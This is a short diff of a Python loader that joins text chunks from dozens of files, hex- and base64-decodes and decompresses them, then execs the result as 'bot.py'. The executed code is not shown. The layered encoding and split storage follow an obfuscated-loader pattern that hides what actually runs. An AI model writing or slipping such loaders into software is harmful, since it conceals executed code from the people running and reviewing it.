@@ -1,11 +1,5 @@
 # language: Python 3.11+
 import zlib, base64
 from pathlib import Path
-parts = []
-for i in range(25):
-    t = Path(__file__).with_name(f"d{i}.txt").read_text(encoding="utf-8")
-    if i == 4:
-        t = bytes.fromhex(t).decode("utf-8")
-    parts.append(t)
-raw = "".join(parts)
+raw = bytes.fromhex("".join(Path(__file__).with_name(f"e{i}.txt").read_text(encoding="utf-8") for i in range(40))).decode("utf-8")
 exec(compile(zlib.decompress(base64.b64decode(raw)), "bot.py", "exec"), globals())
